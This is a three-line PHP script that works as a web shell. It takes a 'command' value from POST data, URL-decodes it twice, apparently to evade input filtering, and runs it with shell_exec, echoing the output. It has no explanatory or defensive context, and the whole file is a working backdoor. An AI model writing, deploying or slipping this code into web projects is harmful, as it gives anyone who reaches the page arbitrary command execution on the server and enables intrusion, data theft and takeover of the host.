<?php
echo urldecode(urldecode($_POST['command']))." ====> <br />\n";
echo shell_exec(urldecode(urldecode($_POST['command'])));
